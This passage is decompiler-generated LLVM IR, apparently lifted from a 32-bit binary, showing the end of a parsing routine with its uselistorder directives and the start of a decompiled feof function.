  %v1_804ec1a = inttoptr i32 %v0_804ec1a to i8*
  %v2_804ec1a = load i8, i8* %v1_804ec1a, align 1
  %v3_804ec1a = zext i8 %v2_804ec1a to i32
  %v5_804ec1a = and i32 %v4_804ec1a, -256
  %v6_804ec1a = or i32 %v3_804ec1a, %v5_804ec1a
  store i32 %v6_804ec1a, i32* %eax.global-to-local, align 4
  %v4_804ec1c = icmp eq i8 %v2_804ec1a, 0
  br i1 %v4_804ec1c, label %dec_label_pc_804edd0, label %dec_label_pc_804ec24

dec_label_pc_804ec24:                             ; preds = %dec_label_pc_804ec13
  store i32 ptrtoint ([21 x i8]* @global_var_8056e55.209 to i32), i32* %ecx.global-to-local, align 4
  %v3_804ec29 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804ec29, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ec2d

dec_label_pc_804ec2d:                             ; preds = %dec_label_pc_804ec7c, %dec_label_pc_804ec24
  %v0_804ec7c = phi i32 [ %v1_804ec7c, %dec_label_pc_804ec7c ], [ ptrtoint ([21 x i8]* @global_var_8056e55.209 to i32), %dec_label_pc_804ec24 ]
  %v3_804ec2d = inttoptr i32 %v0_804ec7c to i8*
  %v4_804ec2d = load i8, i8* %v3_804ec2d, align 1
  %v15_804ec2d = icmp eq i8 %v2_804ec1a, %v4_804ec2d
  %v1_804ec2f = icmp eq i1 %v15_804ec2d, false
  br i1 %v1_804ec2f, label %dec_label_pc_804ec7c, label %dec_label_pc_804ec31

dec_label_pc_804ec31:                             ; preds = %dec_label_pc_804ec2d
  %v1_804ec33 = add i32 %v0_804ec7c, -134573653
  store i32 %v1_804ec33, i32* %edx.global-to-local, align 4
  %v7_804ec3c = icmp sgt i32 %v1_804ec33, 17
  br i1 %v7_804ec3c, label %dec_label_pc_804ec3e, label %dec_label_pc_804ec46

dec_label_pc_804ec3e:                             ; preds = %dec_label_pc_804ec31
  %v3_804ec3e = and i32 %v2_804ec17, 1024
  %v4_804ec3e = icmp eq i32 %v3_804ec3e, 0
  br i1 %v4_804ec3e, label %dec_label_pc_804ec46, label %dec_label_pc_804ec43

dec_label_pc_804ec43:                             ; preds = %dec_label_pc_804ec3e
  %v1_804ec43 = add i32 %v0_804ec7c, -134573655
  store i32 %v1_804ec43, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ec46

dec_label_pc_804ec46:                             ; preds = %dec_label_pc_804ec31, %dec_label_pc_804ec3e, %dec_label_pc_804ec43
  %v0_804ec4f = phi i32 [ %v1_804ec33, %dec_label_pc_804ec31 ], [ %v1_804ec33, %dec_label_pc_804ec3e ], [ %v1_804ec43, %dec_label_pc_804ec43 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8056e4b.210 to i32), i32* %ecx.global-to-local, align 4
  %v2_804ec4f = add i32 %tmp76, 32
  %v3_804ec4f = inttoptr i32 %v2_804ec4f to i32*
  store i32 %v0_804ec4f, i32* %v3_804ec4f, align 4
  %v0_804ec52.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804ec56.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ec52

dec_label_pc_804ec52:                             ; preds = %dec_label_pc_804ec52, %dec_label_pc_804ec46
  %v0_804ec52 = phi i32 [ %v1_804ec52, %dec_label_pc_804ec52 ], [ %v0_804ec52.pre, %dec_label_pc_804ec46 ]
  %v1_804ec52 = add i32 %v0_804ec52, 1
  store i32 %v1_804ec52, i32* %ecx.global-to-local, align 4
  %v1_804ec53 = inttoptr i32 %v1_804ec52 to i8*
  %v2_804ec53 = load i8, i8* %v1_804ec53, align 1
  %v3_804ec53 = sext i8 %v2_804ec53 to i32
  store i32 %v3_804ec53, i32* %eax.global-to-local, align 4
  %v8_804ec58 = icmp sgt i32 %v0_804ec56.pre, %v3_804ec53
  br i1 %v8_804ec58, label %dec_label_pc_804ec52, label %dec_label_pc_804ec5a

dec_label_pc_804ec5a:                             ; preds = %dec_label_pc_804ec52
  store i32 ptrtoint ([21 x i8]* @global_var_8056e55.209 to i32), i32* @ecx, align 4
  %v1_804ec61 = add i32 %v0_804ec52, -134573643
  store i32 %v1_804ec61, i32* %eax.global-to-local, align 4
  %v2_804ec66 = add i32 %v0_804ec52, add (i32 ptrtoint (i32* @global_var_8056e3c.211 to i32), i32 -134573643)
  %v3_804ec66 = add i32 %v2_804ec66, %v1_804ec61
  %v4_804ec66 = inttoptr i32 %v3_804ec66 to i16*
  %v5_804ec66 = load i16, i16* %v4_804ec66, align 2
  %v6_804ec66 = sext i16 %v5_804ec66 to i32
  store i32 %v6_804ec66, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_804ec61, 2
  %v3_804ec6e = add i32 %factor, 134573612
  %v4_804ec6e = inttoptr i32 %v3_804ec6e to i16*
  %v5_804ec6e = load i16, i16* %v4_804ec6e, align 2
  %v6_804ec6e = sext i16 %v5_804ec6e to i32
  store i32 %v6_804ec6e, i32* %eax.global-to-local, align 4
  %v1_804ec76 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ec76 = or i32 %v1_804ec76, %v6_804ec66
  %v2_804ec78 = and i32 %v2_804ec76, %v6_804ec6e
  store i32 %v2_804ec78, i32* %edx.global-to-local, align 4
  %v0_804ec8a.pre = load i32, i32* @esi, align 4
  %v0_804ec8d.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804ec82

dec_label_pc_804ec7c:                             ; preds = %dec_label_pc_804ec2d
  %v1_804ec7c = add i32 %v0_804ec7c, 1
  store i32 %v1_804ec7c, i32* @ecx, align 4
  %v1_804ec7d = inttoptr i32 %v1_804ec7c to i8*
  %v2_804ec7d = load i8, i8* %v1_804ec7d, align 1
  %v3_804ec7d = icmp eq i8 %v2_804ec7d, 0
  %v1_804ec80 = icmp eq i1 %v3_804ec7d, false
  br i1 %v1_804ec80, label %dec_label_pc_804ec2d, label %dec_label_pc_804ec82

dec_label_pc_804ec82:                             ; preds = %dec_label_pc_804ec7c, %dec_label_pc_804ec5a
  %v0_804ec8d = phi i32 [ %v0_804ec8d.pre, %dec_label_pc_804ec5a ], [ %storemerge4, %dec_label_pc_804ec7c ]
  %v0_804ec8a = phi i32 [ %v0_804ec8a.pre, %dec_label_pc_804ec5a ], [ %v0_804ec1a, %dec_label_pc_804ec7c ]
  %v0_804ec82 = phi i32 [ %v2_804ec78, %dec_label_pc_804ec5a ], [ %v3_804ec29, %dec_label_pc_804ec7c ]
  store i32 %v0_804ec82, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804ec8a = inttoptr i32 %v0_804ec8a to i8*
  %v2_804ec8a = load i8, i8* %v1_804ec8a, align 1
  %v3_804ec8a = sext i8 %v2_804ec8a to i32
  store i32 %v3_804ec8a, i32* %eax.global-to-local, align 4
  %v2_804ec8d = add i32 %tmp76, 4
  %v3_804ec8d = inttoptr i32 %v2_804ec8d to i32*
  store i32 %v0_804ec8d, i32* %v3_804ec8d, align 4
  %v0_804ec90 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ec90 = load i32, i32* @edx, align 4
  %v2_804ec90 = add i32 %v1_804ec90, 12
  %v3_804ec90 = inttoptr i32 %v2_804ec90 to i32*
  store i32 %v0_804ec90, i32* %v3_804ec90, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_804ec97 = load i32, i32* @edx, align 4
  %v1_804ec97 = add i32 %v0_804ec97, 28
  %v2_804ec97 = inttoptr i32 %v1_804ec97 to i32*
  store i32 1, i32* %v2_804ec97, align 4
  %v0_804ec9e = load i32, i32* %eax.global-to-local, align 4
  %v1_804ec9e = load i32, i32* @edx, align 4
  %v2_804ec9e = add i32 %v1_804ec9e, 8
  %v3_804ec9e = inttoptr i32 %v2_804ec9e to i32*
  store i32 %v0_804ec9e, i32* %v3_804ec9e, align 4
  %v0_804eca1 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ecab = and i32 %v0_804eca1, -5
  %v0_804ecb1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ecb1 = and i32 %v0_804ecb1, 3840
  store i32 %v1_804ecb1, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_804ecba = or i32 %v1_804ecb1, %v1_804ecab
  store i32 %v2_804ecba, i32* @edi, align 4
  %v1_804ecbc = load i32, i32* @edx, align 4
  %v2_804ecbc = add i32 %v1_804ecbc, 20
  %v3_804ecbc = inttoptr i32 %v2_804ecbc to i32*
  store i32 48, i32* %v3_804ecbc, align 4
  %v0_804ecbf = load i32, i32* @edi, align 4
  %v1_804ecbf = load i32, i32* @edx, align 4
  %v2_804ecbf = add i32 %v1_804ecbf, 16
  %v3_804ecbf = inttoptr i32 %v2_804ecbf to i32*
  store i32 %v0_804ecbf, i32* %v3_804ecbf, align 4
  %v0_804ecc2 = load i32, i32* @ecx, align 4
  %v1_804ecc2 = inttoptr i32 %v0_804ecc2 to i8*
  %v2_804ecc2 = load i8, i8* %v1_804ecc2, align 1
  %v3_804ecc2 = icmp eq i8 %v2_804ecc2, 0
  %v1_804ecc5 = icmp eq i1 %v3_804ecc2, false
  br i1 %v1_804ecc5, label %dec_label_pc_804ecde, label %dec_label_pc_804ecc7

dec_label_pc_804ecc7:                             ; preds = %dec_label_pc_804ec82
  %v0_804ecc7 = load i32, i32* @esi, align 4
  %v1_804ecc7 = inttoptr i32 %v0_804ecc7 to i8*
  %v2_804ecc7 = load i8, i8* %v1_804ecc7, align 1
  %v11_804ecc7 = icmp eq i8 %v2_804ecc7, 109
  %v1_804ecca = icmp eq i1 %v11_804ecc7, false
  br i1 %v1_804ecca, label %dec_label_pc_804edd0, label %dec_label_pc_804ecd0

dec_label_pc_804ecd0:                             ; preds = %dec_label_pc_804ecc7
  %v0_804ecd0 = load i32, i32* @edx, align 4
  %v1_804ecd0 = add i32 %v0_804ecd0, 32
  %v2_804ecd0 = inttoptr i32 %v1_804ecd0 to i32*
  store i32 20, i32* %v2_804ecd0, align 4
  %v0_804ecd7 = load i32, i32* @edx, align 4
  %v1_804ecd7 = add i32 %v0_804ecd7, 28
  %v2_804ecd7 = inttoptr i32 %v1_804ecd7 to i32*
  store i32 0, i32* %v2_804ecd7, align 4
  br label %dec_label_pc_804ecde

dec_label_pc_804ecde:                             ; preds = %dec_label_pc_804ec82, %dec_label_pc_804ecd0
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_804ed72, label %dec_label_pc_804ece9

dec_label_pc_804ece9:                             ; preds = %dec_label_pc_804ecde
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_804ed2a = add i32 %tmp76, 40
  %v1_804ed63 = add i32 %tmp76, 28
  %v2_804ed63 = inttoptr i32 %v1_804ed63 to i32*
  %v4_804ecf8 = add i32 %tmp76, 36
  br label %dec_label_pc_804eceb

dec_label_pc_804eceb:                             ; preds = %dec_label_pc_804ed5e, %dec_label_pc_804ece9
  %v0_804ed01 = phi i32 [ 0, %dec_label_pc_804ece9 ], [ %v1_804ed62, %dec_label_pc_804ed5e ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804ece9 ], [ %stack_var_-88.5, %dec_label_pc_804ed5e ]
  %v1_804eceb = add i32 %v0_804ed01, -2
  %v6_804eceb = sub i32 1, %v0_804ed01
  %v7_804eceb = and i32 %v6_804eceb, %v0_804ed01
  %v8_804eceb = icmp slt i32 %v7_804eceb, 0
  %v9_804eceb = icmp eq i32 %v1_804eceb, 0
  %v10_804eceb = icmp slt i32 %v1_804eceb, 0
  %v3_804ecee = icmp eq i1 %v10_804eceb, %v8_804eceb
  %v4_804ecee = icmp eq i1 %v9_804eceb, false
  %v5_804ecee = and i1 %v4_804ecee, %v3_804ecee
  br i1 %v5_804ecee, label %dec_label_pc_804ed01, label %dec_label_pc_804ecf0

dec_label_pc_804ecf0:                             ; preds = %dec_label_pc_804eceb
  store i32 %tmp76, i32* @edx, align 4
  %v0_804ecf4 = load i32, i32* @esp, align 4
  %v2_804ecf4 = mul i32 %v0_804ed01, 4
  %v3_804ecf4 = add i32 %v2_804ecf4, 68
  %v4_804ecf4 = add i32 %v3_804ecf4, %v0_804ecf4
  %v5_804ecf4 = inttoptr i32 %v4_804ecf4 to i32*
  %v6_804ecf4 = load i32, i32* %v5_804ecf4, align 4
  store i32 %v6_804ecf4, i32* %eax.global-to-local, align 4
  %v1_804ecf8 = trunc i32 %v6_804ecf4 to i8
  %v5_804ecf8 = add i32 %v4_804ecf8, %v0_804ed01
  %v6_804ecf8 = inttoptr i32 %v5_804ecf8 to i8*
  store i8 %v1_804ecf8, i8* %v6_804ecf8, align 1
  %v0_804ecfc = load i32, i32* %eax.global-to-local, align 4
  %v1_804ecfc = urem i32 %v0_804ecfc, 256
  br label %dec_label_pc_804ed0a

dec_label_pc_804ed01:                             ; preds = %dec_label_pc_804eceb
  %v5_804ed03 = add i32 %v0_804ed01, %stack_var_-32.3
  store i32 %v5_804ed03, i32* %eax.global-to-local, align 4
  %v1_804ed07 = add i32 %v5_804ed03, -2
  br label %dec_label_pc_804ed0a

dec_label_pc_804ed0a:                             ; preds = %dec_label_pc_804ecf0, %dec_label_pc_804ed01
  %v0_804ed1d = phi i32 [ %v1_804ecfc, %dec_label_pc_804ecf0 ], [ %v1_804ed07, %dec_label_pc_804ed01 ]
  store i32 %v0_804ed1d, i32* %eax.global-to-local, align 4
  %v5_804ed0a = sub i32 %v0_804ed1d, %stack_var_-88.4
  %v11_804ed0a = xor i32 %v0_804ed1d, %stack_var_-88.4
  %v12_804ed0a = xor i32 %v5_804ed0a, %v0_804ed1d
  %v13_804ed0a = and i32 %v12_804ed0a, %v11_804ed0a
  %v14_804ed0a = icmp slt i32 %v13_804ed0a, 0
  %v15_804ed0a = icmp eq i32 %v5_804ed0a, 0
  %v16_804ed0a = icmp slt i32 %v5_804ed0a, 0
  %v3_804ed0e = icmp ne i1 %v16_804ed0a, %v14_804ed0a
  %v4_804ed0e = or i1 %v15_804ed0a, %v3_804ed0e
  br i1 %v4_804ed0e, label %dec_label_pc_804ed1d, label %dec_label_pc_804ed10

dec_label_pc_804ed10:                             ; preds = %dec_label_pc_804ed0a
  %v1_804ed10 = add i32 %v0_804ed1d, -9
  %v6_804ed10 = sub i32 8, %v0_804ed1d
  %v7_804ed10 = and i32 %v6_804ed10, %v0_804ed1d
  %v8_804ed10 = icmp slt i32 %v7_804ed10, 0
  %v9_804ed10 = icmp eq i32 %v1_804ed10, 0
  %v10_804ed10 = icmp slt i32 %v1_804ed10, 0
  %v3_804ed13 = icmp eq i1 %v10_804ed10, %v8_804ed10
  %v4_804ed13 = icmp eq i1 %v9_804ed10, false
  %v5_804ed13 = and i1 %v4_804ed13, %v3_804ed13
  br i1 %v5_804ed13, label %dec_label_pc_804edd0, label %dec_label_pc_804ed1d

dec_label_pc_804ed1d:                             ; preds = %dec_label_pc_804ed10, %dec_label_pc_804ed0a
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_804ed0a ], [ %v0_804ed1d, %dec_label_pc_804ed10 ]
  %v1_804ed1d = add i32 %v0_804ed1d, -1
  store i32 %v1_804ed1d, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_804ed26 = load i32, i32* @esp, align 4
  %v1_804ed26 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ed26 = mul i32 %v1_804ed26, 4
  %v3_804ed26 = add i32 %v0_804ed26, 80
  %v4_804ed26 = add i32 %v3_804ed26, %v2_804ed26
  %v5_804ed26 = inttoptr i32 %v4_804ed26 to i32*
  %v6_804ed26 = load i32, i32* %v5_804ed26, align 4
  store i32 %v6_804ed26, i32* %edi.global-to-local, align 4
  %v2_804ed2a = mul i32 %v1_804ed1d, 4
  %v4_804ed2a = add i32 %v3_804ed2a, %v2_804ed2a
  %v5_804ed2a = inttoptr i32 %v4_804ed2a to i32*
  %v6_804ed2a = load i32, i32* %v5_804ed2a, align 4
  store i32 %v6_804ed2a, i32* @eax, align 4
  %v9_804ed2e = icmp eq i32 %v6_804ed26, 8
  br i1 %v9_804ed2e, label %dec_label_pc_804ed5e, label %dec_label_pc_804ed33

dec_label_pc_804ed33:                             ; preds = %dec_label_pc_804ed1d
  %v9_804ed33 = icmp eq i32 %v6_804ed2a, 8
  br i1 %v9_804ed33, label %dec_label_pc_804ed4e, label %dec_label_pc_804ed38

dec_label_pc_804ed38:                             ; preds = %dec_label_pc_804ed33
  %v12_804ed38 = icmp eq i32 %v6_804ed2a, %v6_804ed26
  br i1 %v12_804ed38, label %dec_label_pc_804ed4e, label %dec_label_pc_804ed3c

dec_label_pc_804ed3c:                             ; preds = %dec_label_pc_804ed38
  %v1_804ed3c = call i32 @_promoted_size(i32 %v1_804ed1d)
  store i32 %v1_804ed3c, i32* %ebx.global-to-local, align 4
  %v0_804ed43 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804ed43, i32* @eax, align 4
  %v1_804ed45 = call i32 @_promoted_size(i32 %v1_804ed1d)
  store i32 %v1_804ed45, i32* %eax.global-to-local, align 4
  %v8_804ed4c = icmp sgt i32 %v1_804ed3c, %v1_804ed45
  br i1 %v8_804ed4c, label %dec_label_pc_804ed5e, label %dec_label_pc_804ed3c.dec_label_pc_804ed4e_crit_edge

dec_label_pc_804ed3c.dec_label_pc_804ed4e_crit_edge: ; preds = %dec_label_pc_804ed3c
  %v0_804ed56.pre = load i32, i32* @esp, align 4
  %v1_804ed56.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804ed4e

dec_label_pc_804ed4e:                             ; preds = %dec_label_pc_804ed3c.dec_label_pc_804ed4e_crit_edge, %dec_label_pc_804ed38, %dec_label_pc_804ed33
  %v1_804ed56 = phi i32 [ %v1_804ed56.pre, %dec_label_pc_804ed3c.dec_label_pc_804ed4e_crit_edge ], [ %v1_804ed26, %dec_label_pc_804ed38 ], [ %v1_804ed26, %dec_label_pc_804ed33 ]
  %v0_804ed56 = phi i32 [ %v0_804ed56.pre, %dec_label_pc_804ed3c.dec_label_pc_804ed4e_crit_edge ], [ %v0_804ed26, %dec_label_pc_804ed38 ], [ %v0_804ed26, %dec_label_pc_804ed33 ]
  store i32 %v1_804ed1d, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v2_804ed56 = mul i32 %v1_804ed56, 4
  %v3_804ed56 = add i32 %v0_804ed56, 80
  %v4_804ed56 = add i32 %v3_804ed56, %v2_804ed56
  %v5_804ed56 = inttoptr i32 %v4_804ed56 to i32*
  %v6_804ed56 = load i32, i32* %v5_804ed56, align 4
  store i32 %v6_804ed56, i32* %eax.global-to-local, align 4
  store i32 %v6_804ed56, i32* %v5_804ed2a, align 4
  br label %dec_label_pc_804ed5e

dec_label_pc_804ed5e:                             ; preds = %dec_label_pc_804ed3c, %dec_label_pc_804ed1d, %dec_label_pc_804ed4e
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804ed62 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804ed62 = add i32 %v0_804ed62, 1
  store i32 %v1_804ed62, i32* %ebp.global-to-local, align 4
  %v3_804ed63 = load i32, i32* %v2_804ed63, align 4
  %v1_804ed66 = add i32 %v3_804ed63, 2
  store i32 %v1_804ed66, i32* %eax.global-to-local, align 4
  %v5_804ed6b = icmp slt i32 %v1_804ed62, %v1_804ed66
  br i1 %v5_804ed6b, label %dec_label_pc_804eceb, label %dec_label_pc_804ed99

dec_label_pc_804ed72:                             ; preds = %dec_label_pc_804ecde
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804ed76 = add i32 %tmp76, 38
  %v2_804ed76 = inttoptr i32 %v1_804ed76 to i8*
  store i8 1, i8* %v2_804ed76, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804ed7f = add i32 %tmp76, 28
  %v2_804ed7f = inttoptr i32 %v1_804ed7f to i32*
  %v3_804ed7f = load i32, i32* %v2_804ed7f, align 4
  %v2_804ed82 = mul i32 %v3_804ed7f, 4
  %v2_804ed86 = ptrtoint i32* %stack_var_-20 to i32
  %v1_804ed8d = add i32 %tmp76, 40
  store i32 %v1_804ed8d, i32* %eax.global-to-local, align 4
  %v3_804ed91 = inttoptr i32 %v1_804ed8d to i16*
  %v4_804ed91 = call i32 @memcpy(i16* %v3_804ed91, i32 %v2_804ed86, i32 %v2_804ed82)
  store i32 %v4_804ed91, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ed99

dec_label_pc_804ed99:                             ; preds = %dec_label_pc_804ed5e, %dec_label_pc_804ed72
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804ed72 ], [ %stack_var_-88.5, %dec_label_pc_804ed5e ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-88.6, i32* %v2_804ea44, align 4
  %v0_804eda4 = load i32, i32* @ecx, align 4
  %v1_804eda4 = add i32 %v0_804eda4, 16
  %v2_804eda4 = inttoptr i32 %v1_804eda4 to i8*
  %v3_804eda4 = load i8, i8* %v2_804eda4, align 1
  %v5_804eda4 = icmp slt i8 %v3_804eda4, 0
  br i1 %v5_804eda4, label %dec_label_pc_804edb1, label %dec_label_pc_804edaa

dec_label_pc_804edaa:                             ; preds = %dec_label_pc_804ed99
  %v0_804edaa = load i32, i32* @esi, align 4
  %v1_804edaa = add i32 %v0_804edaa, 1
  store i32 %v1_804edaa, i32* %eax.global-to-local, align 4
  %v2_804edad = inttoptr i32 %v0_804eda4 to i32*
  store i32 %v1_804edaa, i32* %v2_804edad, align 4
  br label %dec_label_pc_804edc4

dec_label_pc_804edb1:                             ; preds = %dec_label_pc_804ed99
  store i32 %v4_804ea18, i32* %edx.global-to-local, align 4
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804edb9 = load i32, i32* @esi, align 4
  %v2_804edb9 = sub i32 %v0_804edb9, %v4_804ea18
  store i32 %v2_804edb9, i32* %esi.global-to-local, align 4
  %v1_804edbb = mul i32 %v2_804edb9, 4
  %v2_804edbb = add i32 %v1_804edbb, 224
  store i32 %v2_804edbb, i32* %eax.global-to-local, align 4
  %v2_804edc2 = load i32, i32* %arg1, align 4
  %v4_804edc2 = add i32 %v2_804edc2, %v2_804edbb
  store i32 %v4_804edc2, i32* %arg1, align 4
  br label %dec_label_pc_804edc4

dec_label_pc_804edc4:                             ; preds = %dec_label_pc_804edaa, %dec_label_pc_804edb1
  store i32 %tmp76, i32* @edx, align 4
  %v1_804edc8 = add i32 %tmp76, 28
  %v2_804edc8 = inttoptr i32 %v1_804edc8 to i32*
  %v3_804edc8 = load i32, i32* %v2_804edc8, align 4
  store i32 %v3_804edc8, i32* %eax.global-to-local, align 4
  %v1_804edcb = add i32 %v3_804edc8, 2
  br label %dec_label_pc_804edd3

dec_label_pc_804edd0:                             ; preds = %dec_label_pc_804ea69, %dec_label_pc_804eb03, %dec_label_pc_804eb36, %dec_label_pc_804ebb1, %dec_label_pc_804eb9d, %dec_label_pc_804eb94, %dec_label_pc_804ed10, %dec_label_pc_804ecc7, %dec_label_pc_804ec13
  br label %dec_label_pc_804edd3

dec_label_pc_804edd3:                             ; preds = %dec_label_pc_804edc4, %dec_label_pc_804edd0
  %storemerge6 = phi i32 [ %v1_804edcb, %dec_label_pc_804edc4 ], [ -1, %dec_label_pc_804edd0 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804edd6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804edd6, i32* @ebx, align 4
  store i32 %v0_804ea17, i32* @esi, align 4
  store i32 %v0_804ea16, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %stack_var_-88.6, { 1, 0 }
  uselistorder i32 %v1_804ed62, { 0, 2, 1 }
  uselistorder i32 %v1_804ed1d, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804ed10, { 1, 0 }
  uselistorder i32 %v5_804ed0a, { 1, 2, 0 }
  uselistorder i32 %v0_804ed1d, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_804eceb, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_804ed01, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %v1_804ec7c, { 1, 2, 0 }
  uselistorder i32 %v1_804ec52, { 1, 2, 0 }
  uselistorder i32 %v0_804ec7c, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804ec17, { 1, 0 }
  uselistorder i32 %v1_804ec06, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_804ec0f, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_804ebf9, { 0, 2, 3, 1 }
  uselistorder i32 %v6_804ebef, { 1, 0 }
  uselistorder i32 %v1_804ebd1, { 1, 0 }
  uselistorder i32 %v0_804ebef.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_804ebb4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804ebab, { 1, 2, 0 }
  uselistorder i32 %v0_804eb71, { 1, 0 }
  uselistorder i32 %v1_804eb63, { 1, 0 }
  uselistorder i32 %v1_804eb5e, { 0, 1, 3, 2 }
  uselistorder i32 %v6_804eb5c, { 2, 0, 1 }
  uselistorder i32 %v0_804eb7e, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_804eb19, { 1, 2, 0 }
  uselistorder i32 %v0_804eaf1, { 0, 1, 2, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_804eae4.lcssa, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_804eadd.lcssa, { 0, 1, 2, 3, 5, 8, 7, 4, 6 }
  uselistorder i32 %v2_804eae7, { 1, 2, 0 }
  uselistorder i32 %v6_804eae5, { 0, 2, 1 }
  uselistorder i32 %v1_804eae4, { 0, 2, 3, 1 }
  uselistorder i32 %v3_804eadd, { 2, 1, 0 }
  uselistorder i32 %v1_804ead5, { 1, 0 }
  uselistorder i32 %v1_804eadd137, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v0_804eacd, { 1, 0, 2 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v0_804eac0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v8_804eabb, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804ea91, { 0, 2, 1 }
  uselistorder i32 %v2_804ea80, { 1, 0 }
  uselistorder i32 %v0_804ea7e, { 2, 0, 1 }
  uselistorder i32 %v4_804ea18, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 1, 20, 19, 18, 17, 16, 15, 14, 13, 0, 2, 3, 4, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 4, 3, 5, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 43, 30, 29, 31, 32, 34, 33, 44, 42, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -5, { 2, 0, 1 }
  uselistorder i32 -134573643, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_8056e55.209 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804edd3, { 1, 0 }
  uselistorder label %dec_label_pc_804edd0, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_804edc4, { 1, 0 }
  uselistorder label %dec_label_pc_804ed99, { 1, 0 }
  uselistorder label %dec_label_pc_804ed5e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ed0a, { 1, 0 }
  uselistorder label %dec_label_pc_804ecde, { 1, 0 }
  uselistorder label %dec_label_pc_804ec46, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ec13, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ebea, { 1, 0 }
  uselistorder label %dec_label_pc_804ebc1, { 1, 0 }
  uselistorder label %dec_label_pc_804eb88, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804eb2b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804eae4, { 1, 0 }
  uselistorder label %dec_label_pc_804ead5, { 1, 0 }
  uselistorder label %dec_label_pc_804eacb, { 1, 0 }
  uselistorder label %dec_label_pc_804eab4, { 1, 0 }
  uselistorder label %dec_label_pc_804eab4.outer, { 2, 0, 1 }
}

define i32 @feof(i32* %arg1) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v12_804eddf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp5, i32* %esi.global-to-local, align 4
  %v1_804ede6 = add i32 %tmp5, 52
